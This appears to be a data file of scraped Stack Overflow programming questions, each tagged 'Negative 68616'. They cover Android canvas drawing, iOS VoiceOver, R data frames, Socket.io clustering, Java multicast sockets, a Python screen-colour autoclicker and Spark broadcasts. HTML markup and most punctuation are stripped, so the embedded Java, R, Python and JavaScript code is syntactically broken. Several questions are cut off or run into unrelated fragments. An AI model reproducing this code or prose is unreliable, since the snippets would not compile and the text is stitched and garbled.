Using a rect prevents flickering and reduces cpu usagep  pwhen the graph reaches the end I lock the entire canvas and clear the background, draw the graph frame and then continue on plotting.p  pthe problem is that at the beginning of each new page I get a ghost image from the last pagep  pimg srchttpi.stack.imgur.com0AAnH.png altghost image p  pI believe this is caused by double buffering  use of a dirty area when plotting.p  pI have looked for solutions to this problem but none seem adequate for this type of application. Any help is most welcome.p  pThanks JeanPierrep  pCode followsp  precode    private void draw      Point point  null     Canvas canvas  null     Path path  new Path     ArrayListltPointgt pointArray     float oldX  1     boolean setToClear  false     boolean isNewSegment  false      if samplesInQueue  0          return           pointArray  new ArrayListltPointgtint samplesInQueue      for int i  0 i lt samplesInQueue i           take a peek at the point without retrieving it from the point          queue         point  Points.peek          check if first point of segment is the start of a page         if i  0              if lastSegmentEndPoint  null                  if point.x lt lastSegmentEndPoint.x                       yes then we will need to clear the screen now                     isNewSegment  true                               else                   yes then we will need to clear the screen now                 isNewSegment  true                                if point  null              if point.x gt oldX                   put consecutive points in the path point array                 point  Points.poll                 samplesInQueue                 pointArray.addpoint                 oldX  point.x              else                   we have a wrap around, stop and indicate we need to clear                  the screen on the next pass                 if isNewSegment                      setToClear  true                                  break                                  no points, return     if pointArray.size  0          return            fill the path     for int i  0 i lt pointArray.size i          Point p  pointArray.geti          if i  0              if lastSegmentEndPoint  null                  if p.x gt lastSegmentEndPoint.x                       if we have the end of the last segment, move to it                      and line to the new point                     path.moveTolastSegmentEndPoint.x, lastSegmentEndPoint.y                     path.lineTop.x, p.y                  else                       otherwise just line to the new point                     path.moveTop.x, p.y                               else                  path.moveTop.x, p.y                       else              path.lineTop.x, p.y                    if clear  isNewSegment          if clear              clear  false                   we need to clear, lock the whole canvas         canvas  holder.lockCanvas          draw the graph frame  scales         drawGraphFrame  true         drawGraphFramecanvas      else           just draw the path         RectF bounds  new RectF         Rect dirty  new Rect          calculate path bounds         path.computeBoundsbounds, true          int extra  0         dirty.left  int java.lang.Math.floorbounds.left  extra         dirty.top  int java.lang.Math.floorbounds.top  extra         dirty.right  int java.lang.Math.roundbounds.right  0.5         dirty.bottom  int java.lang.Math.roundbounds.bottom  0.5           just lock what is needed to plot the path         canvas  holder.lockCanvasdirty            draw the path     canvas.drawPathpath, linePaint       unlock the canvas     holder.unlockCanvasAndPostcanvas       remember last segment end point     lastSegmentEndPoint  pointArray.getpointArray.size  1       set clear flag for next pass     if setToClear          clear  true       codepre  pDraw frame  clear graph codep  precode    private void drawGraphFrameCanvas canvas       if drawGraphFrame          return           if canvas  null          Log.eTAG, trying to draw on a null canvas         return           drawGraphFrame  false       clear the graph     canvas.drawColorColor.BLACK, Mode.CLEAR       draw the graph frame     canvas.drawLineleftMargin, topMargin, leftMargin, mCanvasHeight  bottomMargin, framePaint     canvas.drawLineleftMargin, mCanvasHeight  bottomMargin, mCanvasWidth  rightMargin, mCanvasHeight              bottomMargin, framePaint       more drawing  codepre
Negative 68616 pI have a universal app on which VoiceOver is behaving strangely, but only on the iPhone. When I delete the app and reinstall on either iPhone or iPad, VoiceOver works as expected and everything is fine. But on iPhone, if I stop the app and then restart it, VoiceOver still works in the sense that you can tap an element and select it for the VO focus in that way but for some reason the leftright swiping stops working  instead of changing the focus, you just hear the clunk sound like you get when you reach the end of a control list.p  pThe app is iOS7 only. Has anybody ever encountered this problemp  pUpdate Ive found that if I put this line in codeviewDidLoadcode of my apps root view controllerp  precodeself.view.accessibilityViewIsModal  YES codepre  peverything works.

Negative 68616 pI have a codedata.framecode consisting of initially one observation.

I want my codestats.dfcode to contain each of those as separate columns.p  pMy problem is that the data.frame is expanded with additional rows for each element of the character vector, so that each row of the data.frame is identical and only varies in the codeachievement.exploreAllBiomes.progresscode field, where each row contains one element of said vector.p  pI have tried the following 3 three things, with and without using codeIcodep  precode stats.dfachievement.exploreAllBiomes.progress        lt Istats.listachievement.exploreAllBiomesprogress  stats.dfachievement.exploreAllBiomes.progress[1]     lt Istats.listachievement.exploreAllBiomesprogress  cbindstats.df, achievement.exploreAllBiomes.progress  Istats.listachievement.exploreAllBiomesprogress codepre  pReceiving either p  precode Error in lt.data.frametmp, achievement.exploreAllBiomes.progress,     replacement has 6 rows, data has 1 codepre  por the duplicate row variant. I assumed codeIcodewould do the trick, but it only seems to work when constructing the data.frame from scratch, so I tried constructing codestats.dfcode with that in mindp  precodestats.df lt data.framestats.list[namesstats.list  achievement.exploreAllBiomes],                      achievement.exploreAllBiomes.value     stats.listachievement.exploreAllBiomesvalue,                      achievement.exploreAllBiomes.progress   Istats.listachievement.exploreAllBiomesprogress codepre  pBut again this produced the duplicate rows. I know that it is possible for an element in a data.frame to contain a vector or list, so I assume there has to be a fairly easy way to achieve this which Im probably just not seeing.p

Negative 68616 pWhat is the emstandard protocolem for running a condition that has an undefined truth value through an codeifcode statement  Namely, Im referring to codelengthcode. I am working on a function, codegrep.dataframecode that will extract with codegrepcode or replace with codegsubcode values in a data frame without having to write loops every time. Heres where Im atp  precodegt dat lt data.framex  letters[13] gt grep.dataframef, dat  character0  codepre  pSo I decided to add an codeifcode statement so that codegrep.dataframecode returns something a bit more widely comprehensible if there are no matches, like codeNULLcode. codeiflengthd  0 NULL else dcode seems nice. But that doesnt look nearly as pretty as codeifis.integerxcode.  Consider the fact that there are 159 codeas.code or codeis.code functions in the codebasecode package alone. I couldnt find one that was for this issue. So then, my question is, strongHow do those published R developers handle this situation in their codestrongp  pI thought of doing this, which doesnt seem half bad I guess.p  precodehas.length lt functionx      iflengthx gt 0 TRUE else FALSE   gt has.lengthcharacter0  [1] FALSE gt has.length1  [1] TRUE codepre  pwhich led to p  precodegt df1 lt data.framex  1 gt ifhas.lengthdf1 NULL else df1    x  1 1 gt df2 lt data.framex  numeric gt ifhas.lengthdf2 NULL else df2  [1] x  lt0 rowsgt or 0length row.names codepre  pwhich strongdoes notstrong work thanks MrFlick for correcting that.  I would like to know the elegant, R developer way to do this.p  pCheers.p  pstrongADD strong So that people have an idea of what Im doing, here are three results.

Below is how I read in test1.txt.p  precodefileinput.changefunction e        if e.target.files  undefined          var reader  new FileReader         reader.onload  function e              markdownString  e.target.result                  reader.readAsTexte.target.files.item0             codepre  pI can read in a file perfectly, but the the directive will replace the HTML before I have opened and read the file, which is fine, but I want to update the directive and have it run again whenever I input a file. Ive tried both attrs.observe and scope.watch, but neither seem to be working for me, perhaps I am just writing them incorrectly p  pThanks in advancedp  pstrongEditstrong a hrefhttpjsfiddle.netvQzKJ32 relnofollowFiddlea With the below help I was able to get the input to chanve, but now its on a delay, not quite what I wanted. Upload files a couple times to see what I mean. Thank youp

Negative 68616 pI am trying to setup a POC for myself using Nginx, Node.js and Socket.io 1.0 using clustering on Rackspace.  I am under the assumption that I need to use clustering because I want this to be scalable across multiple servers if needed. I want each node to have their own instance and as of now I cant see any need for each of the instances to have to talk to each other for any reason.  Again as of now, I believe I need to use clustering for simply the fact that I may have many clients connecting to this server and I want it to be able to grown and shrink accordingly. My end goal is to build a little POC similar to what is shown here a hrefhttpscloud.google.comdevelopersarticlesrealtimegamingwithnodejswebsocketongcp relnofollowhttpscloud.google.comdevelopersarticlesrealtimegamingwithnodejswebsocketongcpap  pI just got what I believe to be a valid setup of the new Socket.io 1.0 established, but when connecting from different devices behind my router, they are all showing the same PID in my logging and I assume this is due to the required stickysessioning by Socket.io.  I am not sure if this is the same as the workerprocess that we used to get with clustering, but again I am still trying to get my head wrapped around all this.p  pFirst I want to know if using clustering and stickysessions is required, since only 1 PID is issued for the same external IP, is there anyway to have each computer treated as its own instance  I do not want to send back a response that updates everyone behind that IP.p  pMy second question is this and it may be a stupid question but im asking anyway  In reading about how to get the stickysessions working I kept seeing people stating to use stickysessions, like by IP Address.  The word like is what got me.  I seemed to have found people referring to using stickysessions with IP and cookies. Can you do it by anything else, such as a username, issued token or anything My concern is if someone is playing with this on a mobile device and they switch towers, the tower will issue a new IP so inturn a new PID would get issued and essentially that players game lost.  Am I understanding this rightp  pPlease forgive me as I am new to Node.js but thought this would be a cool way to learn node.js and clustering in the cloud.  Any info or direction that anyone can provide would be of great help.  Many of the tuts all seem to broadcast events to everyone but i am looking for a scalable solution where each connection can be sent events individually most fo the time. I also need to solve for a number of people behind the same firewall being treated as separate connections when the server communicates to them.  Again if there is any reading or tutorials that you feel may help me with socket.io 1.0 and what I am trying to do, please reply.  Thanksp

Negative 68616 pTeamCity has a feature that as near as I can figure is called service messages. You can see the documentation a hrefhttpconfluence.jetbrains.comdisplayTCD8BuildScriptInteractionwithTeamCity relnofollowherea. Essentially, it lets me write things likep  precodeteamcity[publishArtifacts ltpathgt] codepre  pto tell the build server to do things. I like this feature. It lets me include the build server steps in my build scripts and thus in source control rather than as a configuration on the server. This makes migrating to a different server or recovering from disaster more reliable, documents this behavior, and allows multiple builds to leverage it without additional configuration. Its several less things people have to remember to set up when they make new build configurations, and its much easier to write codeprint ltmessagegtcode than it is to load the build servers web interface and drill through several pages looking for the right configuration page.p  pIve looked around, but I havent been able to find anything that does this for Jenkins.

If I remove the installopener part, it does not work anymore, proving that the proxy is required.  When I use the ftp url, it blocks or timeout if I choose to use these parameters.p  pI understand that ftp and http are two very different protocols. What I dont understand is the mechanism that browsers use to access these ftp servers. I mean, I dont know if there is a layer on server side that interfaces between http and ftp, retriveing a html or if browser, in some other maner, access the ftp and builds the page.p  pThere also might be a confusion with the ftp domain or the url and the connection mode. It seems to me that when urllib2 reads the ftp... it automatically uses the port 21.p

Negative 68616 pI am creating a Windows Phone 8.1 app that will run on devices that we supply to our customers.  We want to associate the device with a customer during provisioning.  As the customer employees use the device, they also have to log in to identify themselves.  This will drive the authorization process.  So really, I want to transparently authenticate the device with no user interaction and then authenticate each user using the usual usernamepassword combination.p  pFor authenticating the device, I am trying to decide whether top  ol liUse Azure Active Directory, setting up the device as a user, storing the password on the device and then add the customer information I need to the device Identity claims during provisioning.li liCreate an Azure storage table or blob and secure it with keys which are stored on the phone, and rotated occasionally.li ol  pOnce the device knows which customer it belongs to, the rest of the process of authenticating the user seems relatively straightforward.  I do have some concerns about multiple authentication headers in the HTTP call, but I havent gotten that far, yet.p  pIm looking for opinions on the best way to do this, or any experiences anyone might have had in attempting something similar.p  pThanks in advance.p

Negative 68616 pI have a basic understanding of PHP, but I feel like what I am trying to do could by done in a much simpler way. I am using PHP to display HTML content for a Wordpress theme. I want users to be able to determine the order in which HTML blocks are displayed. Currently I am using an codeifelseifcode setup. Here is an overly simplified examplep  precodeif  layout  layoutone      echo ltdiv classheadergtHeaderltdivgt    echo ltdiv classcontentgtContentltdivgt    echo ltdiv classfootergtFooterltdivgt  elseif  layout  layouttwo      echo ltdiv classcontentgtContentltdivgt    echo ltdiv classheadergtHeaderltdivgt    echo ltdiv classfootergtFooterltdivgt  elseif  layout  layoutthree      echo ltdiv classfootergtfooterltdivgt    echo ltdiv classheadergtHeaderltdivgt    echo ltdiv classcontentgtContentltdivgt  codepre  pNow, this technique becomes an absolute bear due to the shear number of layout options permutations. So in my mind you would write a separate function for each HTML content block, and then in some way have another function that presents them in the order specified by the user. Or maybe putting all the blocks into an array and then reordering the array based on the layout selection...p  pAnyway, I have hit a wall on how to actually do this. Any guidance would be greatly appreciated. Thanksp
Negative 68616 pI want to create a script to automatically click on a moving target on a game. p  pTo do this I want to check colours on the screen to determine where my target is and then click him, repeating this if he moves.p  pIm not skilled at programming and there might be an easier solution to what I have proposed belowp  p1Split the screen into equal tiles  size of tile should represent the in game object.p  p2Loop through each pixel of each tile and create a histogram of the pixel colours.p  p3If the most common recorded colour matches what we need, we MIGHT have the correct tile. Save the coords and click the object to complete taskp  p4Every 0.5 seconds check colour to determine if the object has moved, if it hasnt, keep clicking, if it has repeat steps 1, 2 and 3.p  pThe step I am unsure of how to do technically is step 1. What data structure would I need for a tile Would a 2D array suffice Store the value of each colour in this array and then determine if it is the object. Also in pseudo how would I split the screen up into tiles to be searched The tile issue is my main problem.p  pEDIT for rayryeng 2p  pI will be using Python for this task. This is not my game, I just want to create a macro to automatically perform a task for me in the game. I have no code yet, I am looking more for the ideas behind making this work than actual code.p  p3rd edit and final codep  precodeusrbinpython  import win32gui, win32api  function to take in coords and return colour  def colourreturnx,y     colours  win32gui.GetPixelwin32gui.GetDCwin32gui.GetActiveWindow, x,y     return colours  def clickx,y     win32api.SetCursorPosx,y     win32api.mouseeventwin32con.MOUSEEVENTFLEFTDOWN,x,y,0,0     win32api.mouseeventwin32con.MOUSEEVENTFLEFTUP,x,y,0,0  variable declaration x  1 y  1  pixelvalue  [] colourfound  0  while x lt 1600     pixelvalue  colourreturnx,y     if pixelvalue  1844766         clickx,y     xx1     print x     print y     if x  1600         yy1         x1         print tile         pixelvalue  0 codepre  pThis is the final code that I have produced. It works but it is incredibly slow. It takes 30 seconds seconds to search all 1600 pixels of y1. I guess it is my method that is not working. Instead of using histograms and tiles I am now just searching for a colour and clicking the coordinates when it matches. What is the fastest method to use when searching an entire screen for a certain colour Ive seen colour detection bots that manage to keep up every second with a moving character.p

Negative 68616 pI have a desktop app that Im in the process of porting to a Django webapp. The app has some quite computationally intensive parts using numpy, scipy and pandas, among other libraries. Obviously importing the computationally intensive code into the webapp and running it isnt a great idea, as this will force the client to wait for a response. p  pTherefore, youd have to farm these tasks out to a background process that notifies the client via AJAX, I guess andor stores the results in the database when its complete. p  pYou also dont want all these tasks running in simultaneously in the case of multiple concurrent users, since that is a great way to bring your server to its knees even with a small number of concurrent requests. Ideally, you want each instance of your webapp to put its tasks into a job queue, that then automagically runs them in an optimal way based on number of cores, available memory, etc..p  pAre there any good Python libraries to help resolve this sort of an issue Are there general strategies that people use in these kinds of situations Or is this just a matter of choosing a good batch scheduler and spawning a new Python interpreter for each processp

Negative 68616 phow do I stop this method from executingp  precodemultSocket.receivemultPacket     codepre  pIm trying to connect two or more machines or applications on the same machine via UDP Multicast with Java. The thing is Im not working with clientserver but more like a distributed object, so there isnt really a distinction between clients and servers.p  pIdeally the first application opened would start sending multicast messages every x seconds, and when the other one gets started would call a method for receiving the message or packet. But since each application can be client or server its tricky to know which one to put to send and the other to receive.p  pMy current idea for fixing this is to make each application send the multicast packet for 10 seconds, if no one responds then listen to multicast packets for 10 seconds, if it doesnt receive anything start sending again and keep the cycle. When one of them finally receives the message, send a confirmation to the sender and both of them can stop listening and sending.p  pBut my problem is the receiving method. It stays listening for incoming multicast packets and I dont know how to stop or pause it.p  pThis is how I init the socket just in casep  precodeMulticastSocket multSocket  new MulticastSocket5001 multSocket.joinGroup230.0.0.1 private byte[] multBuf  new byte[256] DatagramPacket multPacket  new DatagramPacketmultBuf, multBuf.length codepre  pThanks for hearing me out.p  p EDIT p  p EDIT p  pEJP Thanks for your answer This is how I implemented the setSoTimeout on the receive multicast methodp  precodepublic void receiveMulticast throws IOException      multAddress  InetAddress.getByName230.0.0.1     multSocket  new MulticastSocketmultPort     multSocket.joinGroupmultAddress     multBuf  new byte[256]     multPacket  new DatagramPacketmultBuf, multBuf.length      multSocket.setSoTimeout10000      try           This is the sentence I had trouble with         multSocket.receivemultPacket          receivedPacket  true         System.out.printlnReceived something       catch SocketTimeoutException s          System.out.printlnSocket timed out        codepre  pHeres more of the code in case someones curiousp  pThis is my send multicast method which uses sleep for sending every 10 secondsp  precodepublic void sendMulticast throws IOException, InterruptedException      multAddress  InetAddress.getByName230.0.0.1     multSocket  new MulticastSocket     multSocket.joinGroupmultAddress     int tcpPort  5001     String data  String.valueOftcpPort     multBuf  data.getBytes     multPacket  new DatagramPacketmultBuf, multBuf.length, multAddress, multPort      int count  0     while count lt 10          Thread.sleep1000         multSocket.sendmultPacket         count        codepre  pAnd this is where I call those two methods infinitetly on another classp  precodemessageThread  new Thread      Override     public void run          whiletrue             try                  stateLabel.setTextSending                 socket.sendMulticast                 stateLabel.setTextListening                 socket.receiveMulticast              catch IOException ex                  Logger.getLoggerNumerosAmigosView.class.getName.logLevel.SEVERE, null, ex              catch InterruptedException ex                  Logger.getLoggerNumerosAmigosView.class.getName.logLevel.SEVERE, null, ex                             messageThread.start codepre  pSo the result is the program runs infinitely sending a packet for 10 seconds, receiving for 10 seconds and starting over.

Negative 68616 pI have created a program that allows the user to input either a Dvd collection or a book collection.p  pI am fairly happy with what I have managed to achieve still fairly new to programming but I have an annoyance with my search method.p  pThe search does work and returns what the user looks for but it then also prints out that nothing could be found afterwards. The reason being, I think, that the way I have written my code, means that each search parameter is read before ending and returning back to the menu.p  pI strongthinkstrong that I maybe need to use a boolean or similar to end the loop when the conditions of the search are met.p  pI am sure that any experienced programmers will be shaking their head at my code...p  pThe search methodp  precode

Negative 68616 pI get this error message when Im deployingpublishing to Glassfish. I am using Glassfish 4.0, Eclipse Kepler, Maven, Spring Security and PostGreSQL database.p  pEarlier this day everything worked just fine, I could publish without any errors. Then hoping to solve some other problem, where a jsppage couldnt find a ManagedBean class, although I successfully worked with managed beans before, I rightclicked on my project and did build project and then rightclick on projectMavenUpdate Project, which I read somewhere else. After that the error appeared.p  pI guess there is something wrong with the classpath, because I noticed some javaclasses are missing in the buildfolder which can be seen in the project explorer in eclipse. Unfortunatly this is my first JavaEEMaven project so I dont know how to solve this problem.p  prelevant part from Stacktrace appears several timesp

Negative 68616 pI have an isotope thumbnail gallery with 2 filters, 1 sort, and shuffleunshuffle. In my isotope container, I have 19 thumbnails items. Each item has a simple show info with unstyled checkbox. When checked, it shows hidden div text below the thumbnail. This all works great  no issues to the functionality at all. However, when I check the box which unhides the div below it but still in item container, it lays on top of the item below it another item in another container. What Id like is to have it push the item out of the way. Heres the weird thing  if I check the box and the info appears on top of the item below it...and then I click unshuffle sortBy  originalorder, it does push the item out of the way and all is good. But I dont want to constantly push unshuffle for it to act properly. Also, if I uncheck the box to hide the info the items dont move...but if I click unshuffle, they move to where they are supposed to be.

Negative 68616 pInstead of port 25 I want to be able to set the port to be whatever I want, along with the host. But I do not want to set the username or password because credentials will vary. My code base was working fine just using the static method Transport.send to perform the task of sending out emails. Transport has a connect method with no arguments or a method hostportauth credentials. There does not seem to be a way to set just the port and host without using the other two. Transport seems to default to 25 no matter what I try. I am using a tool called smtp4dev to listen on ports that I am testing.

I tried using a blank username, and password to no avail. Any ideas Am I doing something dumbp

My first idea was that the Singleton did not work as expected, and that i try to quit the wrong process. but as you can see in the output, the PIDs are identical. The server receives the terminate command, but just continues to work. This is what the console looks likep  precodeNow serving on port 8000... Server Process PID  1406 shutdown initiated Server Process PID  1406 Server should have shut down Server should have shut down Server should have shut down Server should have shut down Server should have shut down Server should have shut down Server should have shut down Server should have shut down  and so on, until i manually kill the server process codepre  pAm i using multiprocessing in a completely wrong way Is Kivy somehow interfering with the processp

Negative 68616 pI am trying to learn C.  The below data is from a Microsoft C help website. I dont understand this statement, If a base class does not offer a default constructor, the derived class must make an explicit call to a base constructor by using base.p  pI thought that if there is no default constructor for a class, C will automatically assign default values to int, char or whatever is declared in a class.  If a base class does not have a constructor and it has a child class, does the rule mentioned in the last sentence not apply  Please clarify.p  pIn a derived class, if a baseclass constructor is not called explicitly by using the base keyword, the default constructor, if there is one, is called implicitly. This means that the following constructor declarations are effectively the same Cp  precode     public Managerint initialdata                Add further instructions here.        codepre  pCp  precode     public Managerint initialdata      base                Add further instructions here.       codepre  pIf a base class does not offer a default constructor, the derived class must make an explicit call to a base constructor by using base.p
Negative 68616 pI need to write multiple tests e.g. login test, use application once logged in tests, logout test, etc. and need them all to be in separate files. The issue I run into is after each test, at the beginning of the next test being run, a new browser session start and it is no longer logged in due to the new session, so all my tests will fail except the login test. p  pSo, is there a way to use the same browser session to run all of my tests sequentially without having to duplicate my login code Sorry if this is a repost but I have searched and researched and not found any answers.p  pOR, is there a way to chain the test files somehow Like having one file that you run that just calls all the other test filesp

Negative 68616 pI have two problems, which are probably related.

The upload is being triggered by a button click.p  pI want the uploader to add in a list item to a codeltulgtcode for each item being uploaded working fine. I then want to refresh a list which shows the successfully uploaded files. The problem is that even after a successful upload, the old files remain in the control.  p  pFor example, if I upload two files successfully, when I then want to upload two more, four files are being sent to the controller.p  pThe second problem is that I am using the progressall callback to monitor when all files have been uploaded OK. For some reason, the code which should be executed within the callback is not being executed. The code is annotated to indicate where the problem is occurring.  p  pI suspect that there is an issue with the control not recognising that the uploads have finished, hence the problem with not executing the successful upload code, and then in not clearing out the files.

So that the frontend identifies the transfer as a transfer object that is created in the backend controller by combining data from the income and expense models. p  pTo identify that an income actually belongs to a transfer I add the following attributes to the model, where i tell if it is a transfer using the attribute isTransfer, and which expense it belongs to using the expense attribute.p  precodeuse strict     Module dependencies.   var mongoose  requiremongoose,     Schema  mongoose.Schema     Income Schema   var IncomeSchema  new Schema   name      type String,     default ,     required Please fill Income name,     trim true   ,   amount      type String,     default ,     required Please fill Income amount,     trim true   ,   date      type Date,     default ,     required Please fill Income date,     trim true   ,   monthly      type Boolean,     default ,     required Please fill whether income is recurring monthly,     trim true   ,   yearly      type Boolean,     default ,     required Please fill whether income is recurring yearly,     trim true   ,   account      type Schema.ObjectId,     ref Account,     required Please select account    ,   isTransfer      type Boolean,     default false,     trim true   ,   expense     type Schema.ObjectId,     refExpense   ,   created      type Date,     default Date.now   ,   user      type Schema.ObjectId,     ref User      mongoose.modelIncome, IncomeSchema codepre  pThen I imagine creating the transfer in the entire stack would be as easy as running  codeyo meanjscrudmodule transferscodep  pmy next step would be to delete the model for transfers in backend and rewrite the backend controller so that it creates an income and an expense every time i try to create a transfer.p  pThe controller then also returns an actual Transfer object all the way up to the frontend from the backend controller.p  pInitially I tried adding the transfers object as only existing in the frontend and sending requests to create incomes and expenses all the way from the frontend service but it clogged up the code a lot and I had to do many calls to the backend to create one transfer. I.e. p  ul licreate income   save resource call for incomeli liget income id from responseli licreate expense with the income id   save resource call for expenseli litake expense id from responseli liupdate the income with the expense id.  save resource call for income againli ul  pI think it would make more sense to create the transfer object in the backend controller. Is this a reasonable way of managing the transfer objectsp  pDoes it make more sense to create transfers in another way Or on another level of the stackp  pI guess I could create a model for transfer that contains just references to incomes and expenses, but I still would need to create the incomeexpense objects rightp  pSooo, I ran the codeyo meanjscrudmodule ltmodulenamegtcode command and generated a transfers module, and then removed the entire transfers model, and commented it out from the server controller. I kept the frontend representation though, list and create, edit etc. the server controller needs to be reworked so that it relates to income and expense models instead. Example belowp  pThe server Transfers controllers create method thus becomes an abomination of income and expense like soop  precode   Create a Income and Expense   exports.create  functionreq, res    var income  new Incomereq.body   var expense  new Expensereq.body   expense.user  income.user  req.user   console.logRequest   JSON.stringifyreq.body    This should create an income and expense that is part of a transfer   expense.isTransfer  income.isTransfer  true     Generate IDs manually to create the relation between income and expense   income.expense  expense.id  mongoose.Types.ObjectId   expense.income  income.id  mongoose.Types.ObjectId    Set income and expense receiving and sending account, these attributes where simply attached to the body   income.account  req.body.receivingAccount   expense.account  req.body.sendingAccount    Save income if successfull, also save expense, if both succeeds return income and expense   income.savefunctionerr      if err        return res.status400.send         message errorHandler.getErrorMessageerr             else        expense.savefunctionerr          if err            return res.status400.send             message errorHandler.getErrorMessageerr                     else            res.jsonpincome income, expense expense                               codepre  pAnd the client controller for create Transfer, not as ugly, note that the Transfer object created does not correspond to the transfer object defined in the mongoose modelp  precode Create new Transfer when received in the server controller this yields both an income and an expense.     scope.create  function           Create new Transfer object, this defines what your request.body will contain.         var transfer  new Transfers              name this.name,             amount this.amount,             date this.date,             monthly this.recurringmonthly,             yearly this.recurringyearly,             receivingAccount this.receivingAccount.id,             sendingAccount this.sendingAccount.id                     Redirect after save         transfer.savefunctionresponse              location.pathtransfers  response.id               Clear form fields             scope.name           , functionerrorResponse              scope.error  errorResponse.data.message               codepre  pThanksp

I then use these files to both generate the body of my app, and to load the DOM elements for the Jasmine tests inside codeSpec.jscode. This way, one only needs to write the code for the DOM once.pli ol  pAre there specific reasons to prefer 1 over 2 In addition, are there other strategies that can help me in this testing effortp  pThanksp

Both machines have the openssl 1.0.0e version installed, the QT was installed using the web installer copied the needed objects directly, so it wasnt compiled on the machines.p  pAnother thing, while trying tho start the server under windows7 its loading the needed openssl dlls 32bit and it works.p  pAm I missing something p  pP.S. Also the QT examples arent connecting when compiled on 64bit linux machine sslechoserver amp sslechoclientp

The TriangleIndices.Count is a multiple of 3 because you must specify triangle indices so 3 indices by triangle.p  pThe struggle is  In Positions, you can have duplicate points if you put them without checking if they already exists in Positions.br img srchttpi.stack.imgur.comIjn94.png altenter image description herep  pHere you can see that Positions[ 2] and Positions[3] are equals.br If you have 1 or 2 triangles, its ok. But if you have 20000 triangles, it can be a waste of space  it takes longer to process large Collection add items take longer, get item, remove item, ....br So a solution is to remove duplicates Point3D in Positions. But if you do that you must change indices in TriangleIndices. If I take my previoux exemple, this will give br img srchttpi.stack.imgur.comwrsMx.png altenter image description herep  pOne way to remove duplicates items in Positions is by using Distinct.

Negative 68616 pI have a doubt on whether I should store HTML or Text for a specific rails 4 app. As of now, I created a fully customised javascript rich editor for my bloglike website.p  pThe layout format, supports different HTML tags like codeltpgt lth1gt ltblockquotegt ltimggtcode on completely random orders. Also, each paragraph may have a variety of classes that modifies css and are relevant when storing.p  pThe final HTML would look something like thisp  precodeltdiv classeditor postContent ideditor contenteditabletrue gt     lth1 classmode1gtOh what a nice header.lth1gt     ltblockquote classsidequotegtUhh, fancyltblockquotegt     ltp classplain2gtImagine I have the creativity to write something there.ltpgt ltdivgt codepre  pI could simply save the HTML for the content inside codecontenteditablecode div. I would be the only one posting, so theres no XSS problem here. At the same time that would make things less dynamic and harder to atomically editing things. p  pFor example, Im currently uploading images via ajax and manipulating its position with the editor itself. So the images have their own model, in the case I want to update an image I would have to reload all the blogposts that use that image.p  pThe way I see it, creating an abstract model that store paragraphs would enable me to atomise the way I generate views. But I would have a little extra cost processing each article and also the first time I process the view since I plan to partial cache of course. I was thinking about thisp  precodeArticleText.createcontentOh what a nice header, tagnameh1, classmode1,     atomposition1 ArticleText.createcontentUhh, fancy, tagnameblockquote, classsidequote,     atomposition2 codepre  pAnd then I would use a helper to generate the post for each abstract element. Am I overcomplicating things should I stick with simple HTML storingp

Negative 68616 pI have a basic Angular application that shows a list of customers and allows the user to click on a customer to view some customer details. There is controller for the list and a controller for the detail, and a service that fetches the data from the backend. The service uses resource with the cache option set to true, so the data only has to be loaded once.p  pThe problem that I now have, is that everything is loaded and cached, except for the customer pictures. The list can be quite long up to 300 customers so the browser is reloading hundreds of pictures every time the user goes back to the list view.p  pI want the navigation between the list and detail views to be really quick, without round trips to the server. Is there a way to fix this with my current setup or should I use a different layout for my applicationp

Negative 68616 pI am dealing with a new microcontroller LPC4088 from NXP. I needed 2 weeks to study and write a working examples for peripherals IOCONFIG, GPIO, TIMERS, PWM and ADC. Please take a look at my repositories a hrefhttpsdeveloper.mbed.orgteamsSolskicenterKranj relnofollowherea. This is how you will get a feeling for how I work and what my skill level is.  p  pUntil now I could simply disable interrupts and work without them. Now I want to deal with UART peripheral device which strongneeds interruptsstrong. I have never programmed interupts but know something about ARM interrupts. strongSadly just in theorystrong.

I know that I should put ARM exception vectors at the beginning of the program  usually in the startup code. But I dont know how to do this because what I got with the microcontroller is strongalready compiled startup codestrong object file which presumably defines exception vectors, reset handler which sets stacks for C and then jumps to function strongmainstrong in C source code written by user.p  pAfter compilation of my programs using GCC ARM compiler I allways get this prompt, which must allso be the clue which I dont understand because of my inexperience with ARM mcpus directlyp  precode  You must modify vector checksum value in .bin and .hex files.  codepre  pI was thinking of reverse ingeneering the startup code using the Segger Jlink and fixing the exception vectors there, but there must be any other way besides writing my own open source startup code...

Negative 68616 pIm speccing out a feature for our SDK product, which consists UIwise mostly of a WebView. Because of bandwidth restrictions, we have to be really careful when adding more features  libraries every kb counts. To counter this, and free us up to choose our Javascript libraries better, I proposed having our SDK, when it starts, download the latest JS bundle from our server. I have the server in place NodeJS  Gulp based, but am curious if theres a way to validate whether the Javascript file in local storage is the file we actually sent.

Negative 68616 pIm using Opengl and Jbox2d to write a realtime 2d game in Java.p  pI want to start coding the networking components.p  pAlthough it uses box2d, my game is very small and I want to create a barebones architecture using the Kryonet library. p  pThe program itself is a match game like chess. The most logical system I can think of would be to have dedicated server that stores all player data. p  pPlayerA and PlayerB will connect with the dedicated server which will facilitate a TCP link between their computers.p  pWhen the match is complete, both players will communicate the resulting data back to the dedicated server, which will authenticate and then save over their respective player data.p  pFor those familiar, Diablo2 implemented a similar setup.p  pI want this TCP connection to simply send the shape coordinates Vector data  from the host lets say playerA to the client player B which the client will then render on its own.p  pThen I want the client to send mousekeyboard data back to the host. All of the processing will be run on the hosts computer.p  pMy first question Are there any flaws in this network logicp  pMy second question How does one implement barebones serverclient packet transferring as described using Kryonetp  pNote I have done this exact type of packet transferring in C using a different library. The documentationtutorials Ive found for Kryonet are terrible. Suggesting another library with good support is an acceptable answer.p

Negative 68616 pI am broadcasting a large Map 610 GB. I am using sc.broadcastprodrdd to do that. However, I am not sure whether broadcasting is meant only for small datafiles and not for larger objects that I have. If former, what is the recommended practice One option is to use a NoSQL database and then do the lookup using that. One issue with that is I might have to give up performance since I will be going through a single node Region server or whatever equivalent of that is. If anyone has any insight into performance impact of these design choices, that will be greatly appreciated.p

